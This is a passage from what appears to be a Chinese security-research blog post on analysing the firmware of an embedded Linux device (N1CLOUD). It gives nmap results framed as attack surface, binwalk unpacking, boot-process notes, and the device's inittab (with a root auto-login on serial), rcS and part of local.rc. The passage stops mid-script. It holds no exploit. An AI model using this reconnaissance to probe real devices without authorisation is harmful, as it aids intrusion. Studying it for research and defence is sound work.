tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU</span><br><span class="line">| Not valid before: 2021-11-01T08:48:38</span><br><span class="line">|_Not valid after:  2021-12-01T08:48:38</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: nginx/1.16.1</span><br><span class="line">|_http-title: 502 Bad Gateway</span><br><span class="line">17000/tcp open  ssl/http    nginx 1.16.1</span><br><span class="line">|_http-server-header: nginx/1.16.1</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/debug).</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU</span></span><br><span class="line"><span class="string">| Not valid before: 2021-11-01T08:48:38</span></span><br><span class="line"><span class="string">|_Not valid after:  2021-12-01T08:48:38</span></span><br><span class="line"><span class="string">|_ssl-date: TLS randomness does not represent time</span></span><br><span class="line"><span class="string">20223/tcp open  unknown</span></span><br><span class="line"><span class="string">Service Info: Host: N1CLOUD</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2016-09-30T16:08:46</span></span><br><span class="line"><span class="string">|_  start_date: N/A</span></span><br><span class="line"><span class="string">| smb-security-mode: </span></span><br><span class="line"><span class="string">|   account_used: guest</span></span><br><span class="line"><span class="string">|   authentication_level: user</span></span><br><span class="line"><span class="string">|   challenge_response: supported</span></span><br><span class="line"><span class="string">|_  message_signing: disabled (dangerous, but default)</span></span><br><span class="line"><span class="string">| smb-os-discovery: </span></span><br><span class="line"><span class="string">|   OS: Windows 6.1 (Samba 4.6.11)</span></span><br><span class="line"><span class="string">|   Computer name: n1cloud</span></span><br><span class="line"><span class="string">|   NetBIOS computer name: N1CLOUD\x00</span></span><br><span class="line"><span class="string">|   Domain name: \x00</span></span><br><span class="line"><span class="string">|   FQDN: n1cloud</span></span><br><span class="line"><span class="string">|_  System time: 2016-10-01T00:08:42+08:00</span></span><br><span class="line"><span class="string">|_nbstat: NetBIOS name: N1CLOUD, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   311: </span></span><br><span class="line"><span class="string">|_    Message signing enabled but not required</span></span><br><span class="line"><span class="string">|_clock-skew: mean: -2507d22h26m57s, deviation: 4h37m07s, median: -2507d19h46m58s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 163.26 seconds</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>由于UDP端口扫描太慢，所以暂且就不分析了，由TCP扫描的结果可以看出，开放了许多大端口，也就是有相当多的自定义服务，给我们提供了相当多的攻击面。</p><h1 id="2-固件获取"><a href="#2-固件获取" class="headerlink" title="2.固件获取"></a>2.固件获取</h1><p>固件获取的方法通常为官网下载，但对于这款设备，我们无法从官网上获得其固件更新包，这种情况下我们一般有两种选择：抓取升级流量和通过串口提取固件。</p><h1 id="3-固件分析"><a href="#3-固件分析" class="headerlink" title="3.固件分析"></a>3.固件分析</h1><p>使用binwalk查看固件</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230809144741433.png"></p><p>一个很典型的嵌入式Linux类别的固件，binwalk显示了Linux内核映像以及设备树，最后是squashfs的文件系统。</p><p>然后直接binwalk -Me一把梭</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230809145718454.png" alt="image-20230809145718454"></p><p>得到这样的结果，直接去看squashfs-root这个文件夹，因为这里面存储的就是设备运行的各个文件</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230809145835310.png" alt="image-20230809145835310"></p><p>ls可以看到非常多的文件夹，那么这么多的文件夹&#x2F;文件，我们该从哪里入手？</p><h2 id="嵌入式Linux的启动流程"><a href="#嵌入式Linux的启动流程" class="headerlink" title="嵌入式Linux的启动流程"></a>嵌入式Linux的启动流程</h2><p>这里就需要谈一谈嵌入式Linux的启动流程了</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230809150757692.png" alt="image-20230809150757692"></p><p>上面是一个嵌入式Linux设备的典型架构，固件最开始是bootloader，然后跟着bootloader的启动参数，之后就是kernel以及文件系统。</p><p>我上面图中的bootloader实际上包含两个部分：bootloader和boot，bootloader用于引导执行boot，这个boot可以是厂商自己设计的，也可以是使用的开源的boot，比如u-boot。u-boot在系统上电以后，他会完成下面几个重要的任务：</p><ul><li>初始化相关的硬件组件</li><li>初始化系统内存，准备将系统的控制权交给相应的系统</li><li>分配系统的资源</li><li>提供相应的机制，用于定位和加载系统镜像</li><li>加载操作系统，并将控制权移交给操作系统</li></ul><p>这个过程其实就是一些底层硬件初始化的工作，包括包括串行通信端口的配置，内部时钟配置以及一些子硬件系统（I2C、DRAM、Flash、网络子系统等）的配置。另外，U-boot有一个控制台模式，它会等待用户一段时间，等待用户给他一个信息（回车），让他进入控制台模式。如果等待的时间过了用户没有任何操作，系统就继续往下走了。</p><p>在U-boot完成初始化工作以后，它剩下的唯一工作就是<strong>加载并启动linux操作系统内核</strong>。当U-boot开始加载指定物理地址的操作系统内核以后，U-boot引导装入程序的使命就到此结束了，接下来系统由linux内核接管。</p><p><strong>当linux内核开始启动以后，开始打印各种设备信息，此时做的工作就是对各个外设进行驱动初始化</strong>，让他们各就各位。在执行完这些操作以后就要开始<strong>挂载根文件系统</strong>了。</p><h3 id="什么是文件系统？"><a href="#什么是文件系统？" class="headerlink" title="什么是文件系统？"></a>什么是文件系统？</h3><p>我们在Linux下看到的目录结构</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230809153031767.png" alt="image-20230809153031767"></p><p>实际上就是文件系统。</p><p>我们所有的文件都是存储在磁盘中的数据，但如果让我们人工直接去磁盘里面找数据那就有点难为人了。因此文件系统是被开发用于管理磁盘的软件系统，文件在磁盘中的存储位置，寻找方式以及属性等等都由文件系统决定。功能这么重要的软件自然不会只有一种，不同操作系统不同场景使用的文件系统都有差别。</p><p>在我们使用的Linux机器中，一般使用ext3和ext4的文件系统：</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230809154912300.png" alt="image-20230809154912300"></p><p>ext4是基于磁盘的文件系统，但我们的嵌入式设备通常是用不到磁盘来进行文件存储的，嵌入式设备使用的存储设备一般闪存(flash)，闪存主要有NOR和NAND两种技术。在顺手介绍下NOR FLASH和NAND FLASH的区别：</p><p><strong>NOR Flash的读取和我们常见的SDRAM的读取是一样，</strong>用户可以直接运行装载在NOR FLASH里面的代码，这样可以减少SRAM的容量从而节约了成本；<strong>NAND Flash</strong>没有采取内存的随机读取技术，它的读取是以一次读取一块的形式来进行的，通常是一次读取512个字节，采用这种技术的Flash比较廉价。用户不能直接运行NAND Flash上的代码，因此好多使用NAND Flash的开发板除了使用NAND Flash以外，还加上了一块小的NOR Flash来运行启动代码。</p><p>由于Flash存储器的擦写次数是有限的，NAND闪存还有特殊的硬件接口和读写时序。因此，必须针对Flash的硬件特性设计符合应用要求的文件系统；传统的文件系统如ext2等，用作Flash的文件系统会有诸多弊端。</p><p>针对于flash的文件系统也有很多类别：</p><ul><li>jffs2：主要用于NOR型闪存，缺点主要是当文件系统已满或接近满时，因为垃圾收集的关系而使jffs2的运行速度大大放慢。</li><li>yaffs&#x2F;yaffs2：用于NAND型闪存，yaffs与yaffs2的主要区别在于，前者仅支持小页(512 Bytes) NAND闪存，后者则可支持大页(2KB) NAND闪存。同时，yaffs2在内存空间占用、垃圾回收速度、读&#x2F;写速度等方面均有大幅提升。</li><li>squashfs：无论是Nor Flash还是NAND Flash，SquashFS都可以在其上运行。</li></ul><p>其中squashfs这个文件系统使用的是最广的，在我们要分析的这个固件中使用的也是squashfs。</p><p>继续看到嵌入式设备启动流程，前面讲到了内核挂载了文件系统。</p><p>内核文件加载以后，就开始运行第一个程序 &#x2F;sbin&#x2F;init，它的作用是初始化系统环境.</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230809172853758.png" alt="image-20230809172853758"></p><p>在squashfs的根目录下可以看到init程序是指向sbin目录下的init的。由于init是第一个运行的程序，它的进程编号（pid）就是1。其他所有进程都从它衍生，都是它的子进程。</p><p>在Linux下有许多开机就要运行的守护进程(daemon),init的一大作用就是去运行这些开机启动的程序，init会去读取&#x2F;etc&#x2F;inittab这个文本文件，在这个设备中如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"># /etc/inittab init(8) configuration for BusyBox</span><br><span class="line">#</span><br><span class="line"># Copyright (C) 1999-2004 by Erik Andersen &lt;andersen@codepoet.org&gt;</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># Note, BusyBox init doesn&#x27;t support runlevels.  The runlevels field is</span><br><span class="line"># completely ignored by BusyBox init. If you want runlevels, use sysvinit.</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># Format for each entry: &lt;id&gt;:&lt;runlevels&gt;:&lt;action&gt;:&lt;process&gt;</span><br><span class="line">#</span><br><span class="line"># &lt;id&gt;: WARNING: This field has a non-traditional meaning for BusyBox init!</span><br><span class="line">#</span><br><span class="line">#The id field is used by BusyBox init to specify the controlling tty for</span><br><span class="line">#the specified process to run on.  The contents of this field are</span><br><span class="line">#appended to &quot;/dev/&quot; and used as-is.  There is no need for this field to</span><br><span class="line">#be unique, although if it isn&#x27;t you may have strange results.  If this</span><br><span class="line">#field is left blank, it is completely ignored.  Also note that if</span><br><span class="line">#BusyBox detects that a serial console is in use, then all entries</span><br><span class="line">#containing non-empty id fields will _not_ be run.  BusyBox init does</span><br><span class="line">#nothing with utmp.  We don&#x27;t need no stinkin&#x27; utmp.</span><br><span class="line">#</span><br><span class="line"># &lt;runlevels&gt;: The runlevels field is completely ignored.</span><br><span class="line">#</span><br><span class="line"># &lt;action&gt;: Valid actions include: sysinit, respawn, askfirst, wait, once,</span><br><span class="line">#                                  restart, ctrlaltdel, and shutdown.</span><br><span class="line">#</span><br><span class="line">#       Note: askfirst acts just like respawn, but before running the specified</span><br><span class="line">#       process it displays the line &quot;Please press Enter to activate this</span><br><span class="line">#       console.&quot; and then waits for the user to press enter before starting</span><br><span class="line">#       the specified process.</span><br><span class="line">#</span><br><span class="line">#       Note: unrecognised actions (like initdefault) will cause init to emit</span><br><span class="line">#       an error message, and then go along with its business.</span><br><span class="line">#</span><br><span class="line"># &lt;process&gt;: Specifies the process to be executed and it&#x27;s command line.</span><br><span class="line">#</span><br><span class="line"># Note: BusyBox init works just fine without an inittab. If no inittab is</span><br><span class="line"># found, it has the following default behavior:</span><br><span class="line">#         ::sysinit:/etc/init.d/rcS</span><br><span class="line">#         ::askfirst:/bin/sh</span><br><span class="line">#         ::ctrlaltdel:/sbin/reboot</span><br><span class="line">#         ::shutdown:/sbin/swapoff -a</span><br><span class="line">#         ::shutdown:/bin/umount -a -r</span><br><span class="line">#         ::restart:/sbin/init</span><br><span class="line">#</span><br><span class="line"># if it detects that /dev/console is _not_ a serial console, it will</span><br><span class="line"># also run:</span><br><span class="line">#         tty2::askfirst:/bin/sh</span><br><span class="line">#         tty3::askfirst:/bin/sh</span><br><span class="line">#         tty4::askfirst:/bin/sh</span><br><span class="line">#</span><br><span class="line"># Boot-time system configuration/initialization script.</span><br><span class="line"># This is run first except when booting in single-user mode.</span><br><span class="line">#</span><br><span class="line">::sysinit:/bin/hostname -F /etc/hostname</span><br><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># /bin/sh invocations on selected ttys</span><br><span class="line">#</span><br><span class="line"># Note below that we prefix the shell commands with a &quot;-&quot; to indicate to the</span><br><span class="line"># shell that it is supposed to be a login shell.  Normally this is handled by</span><br><span class="line"># login, but since we are bypassing login in this case, BusyBox lets you do</span><br><span class="line"># this yourself...</span><br><span class="line">#</span><br><span class="line"># Start an &quot;askfirst&quot; shell on the console (whatever that may be)</span><br><span class="line"># ::askfirst:-/bin/sh</span><br><span class="line"># Start an &quot;askfirst&quot; shell on /dev/tty2-4</span><br><span class="line"># tty2::askfirst:-/bin/sh</span><br><span class="line"># tty3::askfirst:-/bin/sh</span><br><span class="line"># tty4::askfirst:-/bin/sh</span><br><span class="line"></span><br><span class="line"># /sbin/getty invocations for selected ttys</span><br><span class="line"># tty4::respawn:/sbin/getty 38400 tty5</span><br><span class="line"># tty5::respawn:/sbin/getty 38400 tty6</span><br><span class="line"></span><br><span class="line"># Example of how to put a getty on a serial line (for a terminal)</span><br><span class="line">::respawn:/sbin/getty -L ttyS000 115200 vt100 -n root -I &quot;Auto login as root&quot;</span><br><span class="line">#::respawn:-/bin/sh</span><br><span class="line">#</span><br><span class="line"># Example how to put a getty on a modem line.</span><br><span class="line">#::respawn:/sbin/getty 57600 ttyS2</span><br><span class="line"></span><br><span class="line"># Stuff to do when restarting the init process</span><br><span class="line">::restart:/sbin/init</span><br><span class="line"></span><br><span class="line"># Stuff to do before rebooting</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>inittab文件中的值都是如下格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label:runlevel:action:process</span><br></pre></td></tr></table></figure><p>比如这两行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/bin/hostname -F /etc/hostname</span><br><span class="line">::sysinit:/etc/init.d/rcS</span><br></pre></td></tr></table></figure><p>在系统初始化时就运行hostname程序，并且运行&#x2F;etc&#x2F;init.d&#x2F;rcS这个程序。</p><p>接下来让我们看到&#x2F;etc&#x2F;init.d&#x2F;rcS这个程序</p><p>rcS实际上是一个shell脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mount fs accroding to /etc/fstab </span></span><br><span class="line">mount -a</span><br><span class="line"></span><br><span class="line">LDCONFIG=$(<span class="built_in">type</span> -p ldconfig)</span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$&#123;LDCONFIG&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$&#123;LDCONFIG&#125;</span> -C /tmp/ld.so.cache</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> initscript <span class="keyword">in</span> /etc/init.d/S[0-9][0-9]*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [ -x <span class="variable">$initscript</span> ] ;</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="variable">$initscript</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f /hybroad/local.rc ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;start user local.rc&quot;</span></span><br><span class="line">/bin/sh /hybroad/local.rc</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Start user service if it exists</span></span><br><span class="line"><span class="keyword">if</span> [ -f /root/rc.user ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;start user services&quot;</span></span><br><span class="line">/bin/sh /root/rc.user</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>rcS会执行&#x2F;etc&#x2F;init.d&#x2F;下的所有以S开头的脚本文件</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230809180234370.png" alt="image-20230809180234370"></p><p>然后又会执行&#x2F;hybroad&#x2F;local.rc这个文件，注意到，hybroad这个目录并不是Linux的原生目录，应该是这个设备为了实现其功能而自定义的目录，需要重点关注。</p><p>local.rc的内容如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Export ENV</span></span><br><span class="line"><span class="built_in">export</span> TMPDIR=/var</span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="string">&quot;/lib:/usr/local/lib:/usr/lib:/usr/share/bluetooth/lib:/hybroad/lib&quot;</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/usr/bin:/usr/sbin:/bin:/sbin:/hybroad/bin&quot;</span></span><br><span class="line"><span class="built_in">export</span> TERM=<span class="string">&#x27;vt100&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERMINFO=<span class="string">&#x27;/usr/share/terminfo&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 64 &gt; /proc/sys/kernel/msgmni</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/auto_msgmni</span><br><span class="line"><span class="built_in">echo</span> 204800 &gt; /proc/sys/net/core/rmem_max</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$RUNLEVEL</span> ]; <span class="keyword">then</span></span><br><span class="line">    RUNLEVEL=4</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> RUNLEVEL = <span class="variable">$RUNLEVEL</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$RUNLEVEL</span> = 4 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># Mount /var</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Mount var as 80M&quot;</span></span><br><span class="line">    mount -nt tmpfs -o size=80M,mode=777 tmpfs /var</span><br><span class="line">    <span class="built_in">cd</span> /var</span><br><span class="line">    <span class="built_in">mkdir</span> lib lib/bluetooth lock <span class="built_in">log</span> run tmp dhcpc empty empty/sshd db</span><br><span class="line">    <span class="built_in">touch</span> run/utmp <span class="built_in">log</span>/wtmp</span><br><span class="line">    <span class="built_in">chmod</span> 755 empty</span><br><span class="line">    <span class="built_in">cd</span> -</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">partition_index roothome</span><br><span class="line">ROOTHOME=$?</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$ROOTHOME</span>&quot;</span> -ne 255 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;roothome=<span class="variable">$ROOTHOME</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    partition_index cache</span><br><span class="line">    ROOTHOME=$?</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$ROOTHOME</span>&quot;</span> -ne 255 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;cache=<span class="variable">$ROOTHOME</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ROOTHOME=255</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;roothome=<span class="variable">$ROOTHOME</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$ROOTHOME</span>&quot;</span> -ne 255 ]; <span class="keyword">then</span></span><br><span class="line">    mount -t ext4 /dev/mmcblk0p<span class="variable">$ROOTHOME</span> /root</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;$?&quot;</span> != <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        mke2fs -t ext4 -F /dev/mmcblk0p<span class="variable">$ROOTHOME</span></span><br><span class="line">        <span class="built_in">sleep</span> 2</span><br><span class="line">        mount -t ext4 /dev/mmcblk0p<span class="variable">$ROOTHOME</span> /root</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;mount -t ext4 /dev/mmcblk0p<span class="variable">$ROOTHOME</span> /root&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    ROOTSIZE=`<span class="built_in">df</span> | grep /dev/mmcblk0p<span class="variable">$ROOTHOME</span> | <span class="built_in">cut</span> -b 45-50`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">mount -t ext4 /dev/mmcblk0p17 /storage</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">  mkfs.ext4 -T largefile -F  /dev/mmcblk0p17 -q</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">mount -t ext4 /dev/mmcblk0p17 /storage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line">WIFIID=`lsusb | awk -F<span class="string">&#x27;ID &#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | fgrep <span class="string">&quot;0e8d&quot;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$WIFIID</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$WIFIID</span>&quot;</span> == <span class="string">&quot;0e8d:76a0&quot;</span> ] || [ <span class="string">&quot;<span class="variable">$WIFIID</span>&quot;</span> == <span class="string">&quot;0e8d:7662&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;insmod /kmod/mt7662u_sta.ko&quot;</span></span><br><span class="line">    insmod /kmod/mt7662u_sta.ko</span><br><span class="line">    <span class="keyword">if</span> [ -d /sys/class/net/wlan0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">touch</span> /tmp/wifi_support_5G.txt</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;No Internal WIFI Device&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -x /hybroad/bin/usbmounter ]; <span class="keyword">then</span></span><br><span class="line">    /hybroad/bin/usbmounter &amp;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">ifconfig eth0 up</span><br><span class="line">ifconfig wlan0 up</span><br><span class="line"></span><br><span class="line"><span class="built_in">touch</span> /root/.reboot</span><br><span class="line">cnt=`<span class="built_in">cat</span> /root/.reboot`</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$&#123;cnt&#125;</span> ]; <span class="keyword">then</span></span><br><span 